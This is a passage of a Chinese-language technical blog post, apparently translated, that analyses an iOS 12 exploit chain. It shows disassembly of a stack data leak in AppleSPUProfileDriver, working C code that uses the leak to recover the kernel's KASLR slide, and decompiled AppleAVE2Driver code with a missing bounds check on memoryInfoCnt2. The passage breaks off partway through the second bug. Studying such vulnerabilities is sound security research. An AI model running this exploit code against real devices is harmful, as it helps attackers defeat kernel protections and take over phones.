AppleSPUProfileDriver::signalBreakGated(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">__ZN21AppleSPUProfileDriver16signalBreakGatedEv</span><br><span class="line"></span><br><span class="line">var_48          = <span class="number">-0x48</span></span><br><span class="line">var_44          = <span class="number">-0x44</span></span><br><span class="line">var_40          = <span class="number">-0x40</span></span><br><span class="line">var_18          = <span class="number">-0x18</span></span><br><span class="line">var_10          = <span class="number">-0x10</span></span><br><span class="line">var_s0          =  <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                PACIBSP</span><br><span class="line">                SUB             SP, SP, #<span class="number">0x60</span></span><br><span class="line">                STP             X20, X19, [SP,#<span class="number">0x50</span>+var_10]</span><br><span class="line">                STP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">                ADD             X29, SP, #<span class="number">0x50</span></span><br><span class="line">                MOV             X20, X0</span><br><span class="line">                ADRP            X8, #___stack_chk_guard@PAGE</span><br><span class="line">                NOP</span><br><span class="line">                LDR             X8, [X8,#___stack_chk_guard@PAGEOFF]</span><br><span class="line">                STUR            X8, [X29,#var_18]</span><br><span class="line">                LDR             X19, [X0,#<span class="number">0x30B8</span>]</span><br><span class="line">                MOV             X0, X19</span><br><span class="line">                BL              _IORecursiveLockLock</span><br><span class="line">                LDR             X8, [X20,#<span class="number">0x90</span>]</span><br><span class="line">                CBZ             X8, branch_exit_stub</span><br><span class="line">                STR             WZR, [SP,#<span class="number">0x50</span>+var_48]</span><br><span class="line">                BL              _mach_absolute_time</span><br><span class="line">                MOV             X1, X0  ; <span class="type">unsigned</span> __int64</span><br><span class="line">                MOV             X0, X20 ; <span class="variable language_">this</span></span><br><span class="line">                BL              __ZN21AppleSPUProfileDriver23absolutetime_to_sputimeEy ; AppleSPUProfileDriver::absolutetime_to_sputime(ulong <span class="type">long</span>)</span><br><span class="line">                STR             X0, [SP,#<span class="number">0x50</span>+var_40]</span><br><span class="line">                MOV             W8, #<span class="number">0x30CC</span></span><br><span class="line">                ADD             X0, X20, X8</span><br><span class="line">                BL              _OSIncrementAtomic</span><br><span class="line">                STR             W0, [SP,#<span class="number">0x50</span>+var_44]</span><br><span class="line">                LDR             X0, [X20,#<span class="number">0x90</span>]</span><br><span class="line">                LDR             X8, [X0]</span><br><span class="line">                LDRAA           X9, [X8,#<span class="number">0x90</span>]!</span><br><span class="line">                MOVK            X8, #<span class="number">0x911C</span>,LSL#<span class="number">48</span></span><br><span class="line">                ADD             X1, SP, #<span class="number">0x50</span>+var_48</span><br><span class="line">                MOV             W2, #<span class="number">0x30</span></span><br><span class="line">                BLRAA           X9, X8                        <span class="comment">// Call to IOSharedDataQueue::enqueue</span></span><br><span class="line"></span><br><span class="line">branch_exit_stub                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(<span class="type">void</span>)+<span class="number">38</span></span><br><span class="line">                MOV             X0, X19 ; lock</span><br><span class="line">                BL              _IORecursiveLockUnlock</span><br><span class="line">                LDUR            X8, [X29,#var_18]</span><br><span class="line">                ADRP            X9, #___stack_chk_guard@PAGE</span><br><span class="line">                NOP</span><br><span class="line">                LDR             X9, [X9,#___stack_chk_guard@PAGEOFF]</span><br><span class="line">                <span class="built_in">CMP</span>             X9, X8</span><br><span class="line">                B.NE            branch_stack_chk_fail</span><br><span class="line">                MOV             W0, #<span class="number">0</span></span><br><span class="line">                LDP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">                LDP             X20, X19, [SP,#<span class="number">0x50</span>+var_10]</span><br><span class="line">                ADD             SP, SP, #<span class="number">0x60</span></span><br><span class="line">                RETAB</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">branch_stack_chk_fail                    ; CODE XREF: AppleSPUProfileDriver::signalBreakGated(<span class="type">void</span>)+<span class="number">9</span>C</span><br><span class="line">                BL              ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>可以看到32位值为0保存在<code>var_48</code>中，<code>OSIncrementAtomic</code>调用的结果保存在<code>var_44</code>中，<code>absolutetime_to_sputime</code>的返回值保存在<code>var_40</code>中，但是，还记得为<code>IOSharedDataQueue::enqueue</code>调用提供了<code>0x30</code>大小吗？这意味着任何为初始化的堆栈数据都将泄漏到<code>dataqueue</code>中，虽然<code>dataqueue</code>可能包含泄漏的数据，如果我们不能访问此数据，那将不会对安全产生任何影响。但是<code>IOSharedDataQueue</code>被签名成完全共享。让我们来看下<code>AppleSPUProfileDriverUserClient::clientMemoryForType</code>：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleSPUProfileDriverUserClient::clientMemoryForType(AppleSPUProfileDriverUserClient *<span class="variable language_">this</span>, <span class="type">int</span> type, <span class="type">unsigned</span> <span class="type">int</span> *options, IOMemoryDescriptor **memory)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0xE00002C2</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !type )</span><br><span class="line">  &#123;</span><br><span class="line">    memDesc = AppleSPUProfileDriver::copyBuffer(<span class="variable language_">this</span>-&gt;provider);</span><br><span class="line">    *memory = memDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( memDesc )</span><br><span class="line">      ret = <span class="number">0</span>LL;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      ret = <span class="number">0xE00002D8</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 AppleSPUProfileDriver::copyBuffer(AppleSPUProfileDriver *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  dataQueueLock = <span class="variable language_">this</span>-&gt;dataQueueLock;</span><br><span class="line">  IORecursiveLockLock(<span class="variable language_">this</span>-&gt;dataQueueLock);</span><br><span class="line"></span><br><span class="line">  memDesc = <span class="variable language_">this</span>-&gt;queueMemDesc;</span><br><span class="line">  <span class="keyword">if</span> ( memDesc )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(*memDesc + <span class="number">0x20</span>LL))();                   <span class="comment">// OSObject::retain</span></span><br><span class="line">    buf = <span class="variable language_">this</span>-&gt;queueMemDesc;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="number">0</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  IORecursiveLockUnlock(dataQueueLock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，通过<code>IOConnectMapMemory64</code>可以将<code>IOShareDataQueue</code>映射到内存描述符中，该描述符包含排队的所有数据，包括泄漏的栈数据，为了确定这个漏洞，我们可以先看一个队列泄漏数据的例子：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">78</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> </span><br><span class="line">c0 <span class="number">5</span>a <span class="number">0</span>c <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> f0 <span class="number">42</span> <span class="number">00</span> e0 ff ff ff </span><br><span class="line"><span class="number">50</span> b4 d8 <span class="number">3</span>b e0 ff ff ff </span><br><span class="line"><span class="number">80</span> <span class="number">43</span> <span class="number">03</span> <span class="number">11</span> f0 ff ff ff </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>第一个<code>dword</code>是一个<code>IODataQueueEntry</code>结构的<code>size</code>字段(本例为<code>0x30</code>)，该字段位于队列中每个数据块的前面：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _IODataQueueEntry&#123;</span><br><span class="line">    <span class="built_in">UInt32</span>  size;</span><br><span class="line">    <span class="built_in">UInt8</span>   data[<span class="number">4</span>];</span><br><span class="line">&#125; IODataQueueEntry;</span><br></pre></td></tr></table></figure>

<p>然后我们第三行中看到<code>OSIncrementAtomic</code>的返回值<code>0x78</code>和<code>absolute_to_sputime</code>的值，数据之后是3个内核指针，它们是从堆栈中泄漏出来的。具体来说，我们对第三个指针<code>0xfffffff011034380</code>感兴趣。根据<code>iPhone 8，iOS 12.4</code>的测试，这个指针总是指向<code>__TEXT</code>段，因此通过计算指针偏移，我们可以推断出内核的偏移。信息泄漏的exploit如下所示：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">uint64_t check_memmap_for_kaslr(io_connect_t ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    kern_return_t ret;</span><br><span class="line">    mach_vm_address_t map_addr = <span class="number">0</span>;</span><br><span class="line">    mach_vm_size_t map_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ret = IOConnectMapMemory64(ioconn, <span class="number">0</span>, mach_task_self(), &amp;map_addr, &amp;map_size, kIOMapAnywhere);</span><br><span class="line">    <span class="keyword">if</span> (ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;IOConnectMapMemory64 failed: %x %sn&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint32_t search_val = <span class="number">0xfffffff0</span>; <span class="comment">// Constant value of Kernel code segment higher 32bit addr</span></span><br><span class="line">    uint64_t start_addr = map_addr;</span><br><span class="line">    size_t search_size = map_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((start_addr = (uint64_t)memmem((<span class="keyword">const</span> <span class="type">void</span> *)start_addr, search_size, &amp;search_val, <span class="keyword">sizeof</span>(search_val))))</span><br><span class="line">    &#123;</span><br><span class="line">        uint64_t tmpcalc = *(uint64_t *)(start_addr - <span class="number">4</span>) - INFOLEAK_ADDR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// kaslr offset always be 0x1000 aligned</span></span><br><span class="line">        <span class="keyword">if</span> ((tmpcalc &amp; <span class="number">0xFFF</span>) == <span class="number">0x0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> tmpcalc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start_addr += <span class="keyword">sizeof</span>(search_val);</span><br><span class="line">        search_size = (uint64_t)map_addr + search_size - start_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mach_vm_offset_t get_kaslr(io_connect_t ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    uint64_t scalarInput = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocte a new IOSharedDataQueue </span></span><br><span class="line">    <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">    IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kaslr_iter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!kaslr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// AppleSPUProfileDriverUserClient::extSignalBreak</span></span><br><span class="line">        <span class="comment">// Enqueues a data item of size 0x30, leaking 0x18 bytes off the stack </span></span><br><span class="line">        IOConnectCallStructMethod(ioconn, <span class="number">11</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Map the IOSharedDataQueue and look for the leaked ptr </span></span><br><span class="line">        kaslr = check_memmap_for_kaslr(ioconn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kaslr_iter++ % <span class="number">5</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            scalarInput = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">            IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            scalarInput = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">            IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    scalarInput = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// AppleSPUProfileDriverUserClient::extSetEnabledMethod</span></span><br><span class="line">    IOConnectCallScalarMethod(ioconn, <span class="number">0</span>, &amp;scalarInput, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// Shutdown</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kaslr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="攻击内核"><a href="#攻击内核" class="headerlink" title="攻击内核"></a>攻击内核</h3><p>最后一个漏洞是<code>AppleAVE2Driver</code>中缺少边界检查，<code>AppleAVE2</code>是iOS中的图形驱动程序，在本例中，可通过沙盒逃逸来访问<code>MIDIServer</code>。<code>userclient</code>公开了24个方法，这个漏洞存在于索引7的方法中：<code>_SetSessionSettings</code>，该方法获取一个大小为<code>0x108</code>的输入缓冲区，并通过<code>AppleAVE2Driver::GetIOSurfaceFromCSID</code>方法从输入缓冲区中提供的ID加载<code>IOSurface</code>，最后调用<code>AppleAVE2Driver::Enqueue</code>。具体来说，该方法将加载一个名为<code>InitInfoSurfaceld</code>或<code>InitInfoBuffer</code>的表：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !structIn-&gt;InitInfoSurfaceId )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  initInfoSurfaceId = structIn-&gt;InitInfoSurfaceId;</span><br><span class="line">  <span class="keyword">if</span> ( initInfoSurfaceId )</span><br><span class="line">  &#123;</span><br><span class="line">    initInfoBuffer = AppleAVE2Driver::GetIOSurfaceFromCSID(<span class="variable language_">this</span>-&gt;provider, initInfoSurfaceId, <span class="variable language_">this</span>-&gt;task);</span><br><span class="line">    <span class="variable language_">this</span>-&gt;InitInfoBuffer = initInfoBuffer;</span><br><span class="line">    <span class="keyword">if</span> ( initInfoBuffer )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>AppleAVE2Driver::Enqueue</code>方法将在<code>IOSurface</code>上创建一个<code>IOSurfaceBufferMngr</code>实例：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">bufferMgr = operator new(<span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !IOSurfaceBufferMngr::IOSurfaceBufferMngr(bufferMgr, <span class="number">0</span>LL, <span class="variable language_">this</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( IOSurfaceBufferMngr::CreateBufferFromIOSurface(</span><br><span class="line">         bufferMgr,</span><br><span class="line">         service-&gt;InitInfoBuffer,</span><br><span class="line">         <span class="variable language_">this</span>-&gt;iosurfaceRoot,</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap8[<span class="number">128</span>],</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap8[<span class="number">136</span>],</span><br><span class="line">         <span class="number">1</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         *&amp;<span class="variable language_">this</span>-&gt;gap101[<span class="number">39</span>],</span><br><span class="line">         <span class="string">&quot;InitInfo&quot;</span>,</span><br><span class="line">         <span class="variable language_">this</span>-&gt;gap3AF[<span class="number">49</span>],</span><br><span class="line">         <span class="number">0x1F4</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    err = <span class="number">0xE00002BD</span>LL;</span><br><span class="line">    v28 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(bufferMgr);</span><br><span class="line">    operator delete(v28);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( bufferMgr-&gt;size &lt; <span class="number">0x25DD0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    err = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buffMgrKernAddr = bufferMgr-&gt;kernelAddress;</span><br><span class="line">  <span class="keyword">if</span> ( !buffMgrKernAddr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>考虑到这个缓冲区中的数据(现在映射到<code>buffMgrKernAddr</code>)是由<code>userland</code>控制的，该方法将继续将缓冲区中的大块数据复制到<code>AVEClient*</code>对象中，现在将其命名为<code>currentClient</code>：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">currentClient-&gt;unsigned2400 = *(buffMgrKernAddr + <span class="number">2008</span>);</span><br><span class="line">  memmove(&amp;currentClient-&gt;unsigned2404, buffMgrKernAddr + <span class="number">2012</span>, <span class="number">0x2BE4</span>LL);</span><br><span class="line">  currentClient-&gt;oword5018 = *(buffMgrKernAddr + <span class="number">13296</span>);</span><br><span class="line">  currentClient-&gt;oword5008 = *(buffMgrKernAddr + <span class="number">13280</span>);</span><br><span class="line">  currentClient-&gt;oword4FF8 = *(buffMgrKernAddr + <span class="number">13264</span>);</span><br><span class="line">  currentClient-&gt;oword4FE8 = *(buffMgrKernAddr + <span class="number">13248</span>);</span><br><span class="line">  currentClient-&gt;oword5058 = *(buffMgrKernAddr + <span class="number">13360</span>);</span><br><span class="line">  currentClient-&gt;memoryInfoCnt2 = *(buffMgrKernAddr + <span class="number">0x3420</span>);</span><br><span class="line">  currentClient-&gt;oword5038 = *(buffMgrKernAddr + <span class="number">13328</span>);</span><br><span class="line">  currentClient-&gt;oword5028 = *(buffMgrKernAddr + <span class="number">13312</span>);</span><br><span class="line">  currentClient-&gt;oword5098 = *(buffMgrKernAddr + <span class="number">13424</span>);</span><br><span class="line">  currentClient-&gt;oword5088 = *(buffMgrKernAddr + <span class="number">13408</span>);</span><br><span class="line">  currentClient-&gt;oword5078 = *(buffMgrKernAddr + <span class="number">13392</span>);</span><br><span class="line">  currentClient-&gt;oword5068 = *(buffMgrKernAddr + <span class="number">13376</span>);</span><br><span class="line">  currentClient-&gt;oword50C8 = *(buffMgrKernAddr + <span class="number">13472</span>);</span><br><span class="line">  currentClient-&gt;oword50B8 = *(buffMgrKernAddr + <span class="number">13456</span>);</span><br><span class="line">  currentClient-&gt;oword50A8 = *(buffMgrKernAddr + <span class="number">13440</span>);</span><br><span class="line">  currentClient-&gt;qword50D8 = *(buffMgrKernAddr + <span class="number">13488</span>);</span><br><span class="line">  memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, <span class="number">0x630</span>LL);</span><br><span class="line">  memmove(&amp;currentClient-&gt;gap1C8C[<span class="number">0x5CC</span>], buffMgrKernAddr + <span class="number">1584</span>, <span class="number">0x1A8</span>LL);</span><br></pre></td></tr></table></figure>

<p>通过<code>AppleAVE2DriverUserClient::_ my_close</code>关闭<code>AppleAVE2Driver userclient</code>时，将调用一个名为<code>AppleAVE2Driver::AVE_DestroyContext</code>的函数，该函数位于该<code>userclient</code>关联的<code>AVEClient</code>对象上。<code>AVE_DestroyContext</code>在<code>AVEClient</code>中<code>MEMORY_INFO</code>结构上调用<code>AppleAVE2Driver::DeleteMemoryInfo</code>，并且在倒数第二步客户端的<code>MEMORY_INFO</code>结构数组上调用此函数，其数量由<code>memoryInfoCnt&#123;1,2&#125;</code>字段表示：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">v73 = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v73 &lt;= currentClient-&gt;memoryInfoCnt2 )</span><br><span class="line">    v73 = currentClient-&gt;memoryInfoCnt2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v73 )</span><br><span class="line">  &#123;</span><br><span class="line">    iter1 = <span class="number">0</span>LL;</span><br><span class="line">    statsMapBufArr = currentClient-&gt;statsMapBufferArray;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      AppleAVE2Driver::DeleteMemoryInfo(<span class="variable language_">this</span>, statsMapBufArr);</span><br><span class="line">      ++iter1;</span><br><span class="line"></span><br><span class="line">      loopMax = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;</span><br><span class="line">      cnt2 = currentClient-&gt;memoryInfoCnt2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( loopMax &lt;= cnt2 )</span><br><span class="line">        loopMax = cnt2;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        loopMax = loopMax;</span><br><span class="line"></span><br><span class="line">      statsMapBufArr += <span class="number">0x28</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( iter1 &lt; loopMax );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>_SetSessionSettings</code>中，对<code>memoryInfoCnt1</code>的值进行边界检查：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( currentClient-&gt;memoryInfoCnt1 &gt;= <span class="number">4</span>u )</span><br><span class="line">&#123;</span><br><span class="line">  ret = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，没有检查<code>memoryInfoCnt2</code>的值，这里缺少检查，加上while循环中的逻辑，意味着如果提供足够大的<code>memoryInfoCnt2</code>值，循环将越界访问和调用<code>DeleteMemoryInfo</code>上的数据：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loopMax = currentClient-&gt;memoryInfoCnt1 + <span class="number">2</span>;  <span class="comment">// Take memoryInfoCnt1 (max 4), loopMax is &lt;=6</span></span><br><span class="line"></span><br><span class="line">cnt2 = currentClient-&gt;memoryInfoCnt2;         <span class="comment">// Take memoyInfoCnt2</span></span><br><span class="line"><span class="keyword">if</span> ( loopMax &lt;= cnt2 )                        <span class="comment">// if cnt2 is larger than loopMax...</span></span><br><span class="line">  loopMax = cnt2;                             <span class="comment">// update loopMax to the value of memoryInfoCnt2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  loopMax = loopMax;</span><br></pre></td></tr></table></figure>

